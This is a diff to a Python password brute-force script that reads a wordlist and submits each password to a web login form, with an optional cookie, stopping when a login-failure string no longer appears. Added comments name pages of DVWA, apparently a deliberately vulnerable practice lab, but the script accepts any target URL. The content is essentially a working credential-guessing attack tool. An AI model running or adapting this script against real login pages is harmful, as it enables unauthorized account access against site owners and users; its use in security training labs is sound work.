@@ -8,15 +8,17 @@ password_file = input('[+] Enter Password File To Use: ')
 login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
 cookie_value = input('Enter Cookie Value(Optional): ')
 
-
 def cracking(username,url):
 	for password in passwords:
 		password = password.strip()
 		print(colored(('Trying: ' + password), 'red'))
 		data = {'username':username,'password':password,'Login':'submit'}
+
+		# For accessing the bruteforce page (/vulnerabilities/brute)
 		if cookie_value != '':
 			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
 		else:
+			# Accesing main DVWA login page (/dvwa/login.php)
 			response = requests.post(url, data=data)
 		if login_failed_string in response.content.decode():
 			pass
@@ -26,11 +28,7 @@ def cracking(username,url):
 			exit()
 
 
-
-
 with open(password_file, 'r') as passwords:
 	cracking(username,url)
 
 print('[!!] Password Not In List')
-
-
